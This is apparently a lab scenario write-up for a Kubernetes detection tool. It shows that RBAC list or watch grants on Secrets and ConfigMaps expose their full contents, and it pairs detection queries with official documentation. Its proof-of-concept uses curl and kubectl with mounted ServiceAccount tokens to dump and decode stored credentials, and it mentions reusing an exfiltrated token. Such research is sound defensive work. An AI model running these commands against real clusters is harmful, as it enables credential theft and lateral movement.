### Summary
A subject granted only `list` (or only `watch`) on `secrets` - no `get` - can still read the full contents of every Secret in that namespace. The Kubernetes API returns complete `data` fields on LIST and WATCH, same as GET - it does not offer a metadata-only listing for Secrets.

The same applies to ConfigMaps, where it's worse: ConfigMap data is plaintext by design, and teams still store credentials in them despite the Kubernetes docs saying not to.

The exception is a `list`/`watch` grant restricted by `resourceNames`: it only authorizes requests that select those names with a `metadata.name` field selector, so an unfiltered LIST is denied. This scenario includes that case as a control.

### Details
All resources live in namespace `01-pod-sa-listsecrets`, which holds Secrets `vuln01`, `vuln02` and `api-keys`, and ConfigMap `sensitive-config` with a plaintext `password`.

| Pod | ServiceAccount | Role | Grant | Reads |
|---|---|---|---|---|
| `vuln-pod` | `sa-list-secrets` | `list-secrets` | `list secrets` | all Secrets |
| `watch-pod` | `sa-watch-secrets` | `watch-secrets` | `watch secrets` | all Secrets |
| `named-pod` | `sa-list-named` | `list-secrets-named` | `list secrets`, `resourceNames: [api-keys]` | `api-keys` only |
| `cronjob-pod` | `sa-list-configmaps` | `list-configmaps` | `list configmaps` | all ConfigMaps |

Each pod runs with `automountServiceAccountToken: true`, so its ServiceAccount token is mounted and usable from inside the container.

### PoC
Deploy the resources:

```
$ kubectl apply -f 01-pod-sa-listsecrets.yaml
```

#### list
Confirm the grant is `list`-only:

```
$ kubectl auth can-i get secrets --as=system:serviceaccount:01-pod-sa-listsecrets:sa-list-secrets -n 01-pod-sa-listsecrets
no

$ kubectl auth can-i list secrets --as=system:serviceaccount:01-pod-sa-listsecrets:sa-list-secrets -n 01-pod-sa-listsecrets
yes
```

From inside `vuln-pod`, use the mounted token to call LIST directly:

```
$ kubectl exec -n 01-pod-sa-listsecrets vuln-pod -- sh -c '
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/01-pod-sa-listsecrets/secrets
'
```

Alternatively, use the ServiceAccount's token with `kubectl` from outside the cluster (here minted with `create token`; a token exfiltrated from the pod works the same way):

```
$ export API="https://<API_SERVER>:6443"
$ export TOKEN=$(kubectl -n 01-pod-sa-listsecrets create token sa-list-secrets)

$ kubectl --insecure-skip-tls-verify --server=$API --token=$TOKEN -n 01-pod-sa-listsecrets --kubeconfig <(echo) get secrets -o json
```

Response includes full secret data:

```json
{
  "kind": "SecretList",
  "apiVersion": "v1",
  "items": [
    { "metadata": { "name": "vuln01" }, "data": { "key2": "dG9wc2VjcmV0" } },
    { "metadata": { "name": "vuln02" }, "data": { "database_password": "cGFzc3dvcmQxMjM=" } },
    { "metadata": { "name": "api-keys" }, "data": { "aws_access_key": "QUtJQVhYWFhYWFhYWA==" } }
  ]
}
```

Decoded:

```
$ echo dG9wc2VjcmV0 | base64 -d
topsecret

$ echo cGFzc3dvcmQxMjM= | base64 -d
password123

$ echo QUtJQVhYWFhYWFhYWA== | base64 -d
AKIAXXXXXXXXX
```

#### watch
`watch-pod` has no `list` or `get`, but a WATCH streams an `ADDED` event with the full object for every existing Secret:

```
$ kubectl exec -n 01-pod-sa-listsecrets watch-pod -- sh -c '
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -s -m 3 --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc/api/v1/namespaces/01-pod-sa-listsecrets/secrets?watch=true"
'
{"type":"ADDED","object":{"kind":"Secret","metadata":{"name":"vuln01",...},"data":{"key2":"dG9wc2VjcmV0"}}}
{"type":"ADDED","object":{"kind":"Secret","metadata":{"name":"vuln02",...},"data":{"database_password":"cGFzc3dvcmQxMjM="}}}
...
```

Or with `kubectl` from outside the cluster. `kubectl get --watch` (and `--watch-only`) sends a LIST first and is denied, so request the watch endpoint directly with `--raw`:

```
$ export TOKEN=$(kubectl -n 01-pod-sa-listsecrets create token sa-watch-secrets)

$ kubectl --insecure-skip-tls-verify --server=$API --token=$TOKEN -n 01-pod-sa-listsecrets --kubeconfig <(echo) get secrets --watch -o json
Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:01-pod-sa-listsecrets:sa-watch-secrets" cannot list resource "secrets" in API group "" in the namespace "01-pod-sa-listsecrets"

$ kubectl --insecure-skip-tls-verify --server=$API --token=$TOKEN --kubeconfig <(echo) get --raw "/api/v1/namespaces/01-pod-sa-listsecrets/secrets?watch=true"
{"type":"ADDED","object":{"kind":"Secret","apiVersion":"v1","metadata":{"name":"api-keys",...},"data":{"aws_access_key":"QUtJQVhYWFhYWFhYWA=="},...}}
{"type":"ADDED","object":{"kind":"Secret","apiVersion":"v1","metadata":{"name":"vuln01",...},"data":{"key2":"dG9wc2VjcmV0"},...}}
...
```

#### list restricted by resourceNames (control)
An unfiltered LIST from `named-pod` is denied, because the request carries no object name to match against `resourceNames`:

```
$ kubectl auth can-i list secrets --as=system:serviceaccount:01-pod-sa-listsecrets:sa-list-named -n 01-pod-sa-listsecrets
no
```

Selecting the allowed name with a field selector succeeds and returns only `api-keys`:

```
$ kubectl exec -n 01-pod-sa-listsecrets named-pod -- sh -c '
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc/api/v1/namespaces/01-pod-sa-listsecrets/secrets?fieldSelector=metadata.name=api-keys"
'
```

#### list on configmaps
`cronjob-pod` can only `list` ConfigMaps, which returns every ConfigMap's data in plaintext - no decoding needed:

```
$ kubectl auth can-i get configmaps --as=system:serviceaccount:01-pod-sa-listsecrets:sa-list-configmaps -n 01-pod-sa-listsecrets
no

$ kubectl exec -n 01-pod-sa-listsecrets cronjob-pod -- sh -c '
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/01-pod-sa-listsecrets/configmaps
'
```

```json
{
  "kind": "ConfigMapList",
  "apiVersion": "v1",
  "items": [
    { "metadata": { "name": "sensitive-config" }, "data": { "password": "a98fdshj98dshf" } },
    ...
  ]
}
```

### Impact
Any workload with an unrestricted `list` or `watch` grant on secrets can exfiltrate every secret's plaintext in its namespace, regardless of whether `get` is granted. Given secrets commonly hold credentials, API keys, and TLS material, this is a full confidentiality loss for the namespace and a strong foothold for lateral movement. A `resourceNames` restriction limits the exposure to the named secrets. The same holds for ConfigMaps, which are unencrypted by default, so any credentials stored there are exposed in cleartext.

### KuberHound Detection
`list` or `watch` on `secrets` sets the `TOKEN_LIST` attack capability on the Role and creates `CAN_LIST_SECRETS` / `CAN_WATCH_SECRETS` edges to each reachable secret. When the rule has `resourceNames`, edges are only created to the named secrets and carry `resource_restricted: true`. Combined with `IDENTITY_ASSUME` (Pod -> ServiceAccount) and `BOUND_TO` (ServiceAccount -> Role), the full chain is covered by the saved query:

```cypher
MATCH p=(pod:K8sPod)-[:IDENTITY_ASSUME]->(sa:K8sServiceAccount)-[:BOUND_TO]->(r)-[:CAN_LIST_SECRETS|CAN_WATCH_SECRETS]->(secret:K8sSecret)
WHERE 'TOKEN_LIST' IN r.attack_capabilities
RETURN p
```

Search **"KuberHound: Complete TOKEN_LIST attack path to Secrets"** in BloodHound. Expected paths:

- `vuln-pod -> sa-list-secrets -> list-secrets -> {vuln01, vuln02, api-keys}`
- `watch-pod -> sa-watch-secrets -> watch-secrets -> {vuln01, vuln02, api-keys}`
- `named-pod -> sa-list-named -> list-secrets-named -> api-keys`

For ConfigMaps, `list`/`watch` creates `CAN_LIST_CONFIGMAPS` / `CAN_WATCH_CONFIGMAPS` edges to each reachable ConfigMap. Search **"KuberHound: Complete list/watch attack path to ConfigMaps"**:

- `cronjob-pod -> sa-list-configmaps -> list-configmaps -> {sensitive-config, kube-root-ca.crt}`

### Advisories
Not a CVE - a documented characteristic of the core Kubernetes API. LIST, WATCH and GET serialize the same Secret object, so there's no RBAC way to grant `list` or `watch` without also exposing values. Kubernetes recommends treating `list`/`watch` on `secrets` as equivalent to `get`:
https://kubernetes.io/docs/concepts/configuration/secret/#information-security-for-secrets

Kubernetes also states that ConfigMaps are not meant for sensitive data:
https://kubernetes.io/docs/concepts/configuration/configmap/#configmap-object

Restricting `list`/`watch` with `resourceNames` requires clients to send a matching `metadata.name` field selector:
https://kubernetes.io/docs/reference/access-authn-authz/rbac/#referring-to-resources
